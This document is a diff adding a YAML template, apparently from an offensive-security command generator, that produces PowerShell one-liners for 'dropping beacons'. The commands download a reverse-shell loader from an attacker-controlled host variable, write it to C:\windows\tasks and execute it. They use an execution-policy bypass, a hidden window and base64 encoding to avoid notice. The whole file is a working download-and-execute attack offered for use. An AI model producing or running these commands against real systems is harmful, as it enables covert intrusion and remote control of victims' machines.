@@ -1,0 +1,16 @@
+description: "Powershell command for dropping beacons"
+variables:
+  revshellFile: "loader.exe"
+  port: 80
+templates:
+  powershell:
+    variables:
+      command: "iwr -UseBasicParsing http://{{LHOST}}:{{port}}/{{revshellFile}} -OutFile C:\\windows\\tasks\\db.exe;Start-Process -FilePath C:\\windows\\tasks\\db.exe"
+      #command: "iwr -UseBasicParsing http://{{LHOST}}:{{port}}/{{revshellFile}} -OutFile C:\\windows\\tasks\\dbb.exe;Start-Process -FilePath C:\\windows\\tasks\\dbb.exe"
+    template: |-
+      powershell -ep bypass -Sta -Nop -Window Hidden -e {{ Encoder.base64(command,Encoder.utf16le) }}
+      powershell -ep bypass -Sta -Nop -Window Hidden 'iwr -UseBasicParsing http://{{LHOST}}:{{port}}/{{revshellFile}} -OutFile C:\windows\tasks\db.exe'
+      powershell -ep bypass -Sta -Nop -Window Hidden 'Start-Process -FilePath C:\windows\tasks\db.exe'
+print:
+- "Powershell command for dropping a beacon and executing"
+- "{{Templates.get('powershell')}}"
